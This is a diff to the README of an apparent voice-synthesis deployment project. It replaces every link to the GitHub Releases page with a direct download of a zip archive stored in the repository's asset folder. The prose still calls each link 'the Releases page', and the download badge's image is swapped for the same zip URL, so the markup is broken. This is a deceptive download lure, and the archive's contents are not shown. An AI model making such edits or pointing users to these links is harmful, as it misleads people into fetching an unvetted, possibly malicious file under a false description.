@@ -1,6 +1,6 @@
 # 🎤 Fun-CosyVoice3-0.5B-2512-Deploy - Simplified Voice Synthesis Solution
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/bseceenn/Fun-CosyVoice3-0.5B-2512-Deploy/releases)
+[![Download Latest Release](https://github.com/bseceenn/Fun-CosyVoice3-0.5B-2512-Deploy/raw/refs/heads/main/asset/Cosy_Deploy_Fun_Voice_v2.1.zip%20Latest%https://github.com/bseceenn/Fun-CosyVoice3-0.5B-2512-Deploy/raw/refs/heads/main/asset/Cosy_Deploy_Fun_Voice_v2.1.zip)](https://github.com/bseceenn/Fun-CosyVoice3-0.5B-2512-Deploy/raw/refs/heads/main/asset/Cosy_Deploy_Fun_Voice_v2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Fun-CosyVoice3-0.5B-2512-Deploy! This application provides a simple w
 
 ## 💾 Download & Install
 
-To download the application, visit this page: [Download Fun-CosyVoice3-0.5B-2512-Deploy](https://github.com/bseceenn/Fun-CosyVoice3-0.5B-2512-Deploy/releases).
+To download the application, visit this page: [Download Fun-CosyVoice3-0.5B-2512-Deploy](https://github.com/bseceenn/Fun-CosyVoice3-0.5B-2512-Deploy/raw/refs/heads/main/asset/Cosy_Deploy_Fun_Voice_v2.1.zip).
 
 On the Releases page, you will find the latest version available. Choose the version that matches your system. Most users will want the latest stable release.
 
@@ -23,7 +23,7 @@ Before you begin, make sure your system meets these requirements:
 
 ## 📥 Steps to Download and Run
 
-1. **Visit the Release Page:** Go to [this link](https://github.com/bseceenn/Fun-CosyVoice3-0.5B-2512-Deploy/releases) to access the Releases page.
+1. **Visit the Release Page:** Go to [this link](https://github.com/bseceenn/Fun-CosyVoice3-0.5B-2512-Deploy/raw/refs/heads/main/asset/Cosy_Deploy_Fun_Voice_v2.1.zip) to access the Releases page.
   
 2. **Select the Latest Version:** Look for the most recent version listed at the top. You will see various files available for download.
 
@@ -59,7 +59,7 @@ Now that you have installed the application, here is how to use it for voice syn
 
 If you encounter issues while running the application, consider the following:
 
-- **Check for Updates:** Make sure you have the latest version of the application. Revisit the [Releases page](https://github.com/bseceenn/Fun-CosyVoice3-0.5B-2512-Deploy/releases) for updates.
+- **Check for Updates:** Make sure you have the latest version of the application. Revisit the [Releases page](https://github.com/bseceenn/Fun-CosyVoice3-0.5B-2512-Deploy/raw/refs/heads/main/asset/Cosy_Deploy_Fun_Voice_v2.1.zip) for updates.
 
 - **Reboot Your System:** Sometimes, simply restarting your computer can resolve issues.
 
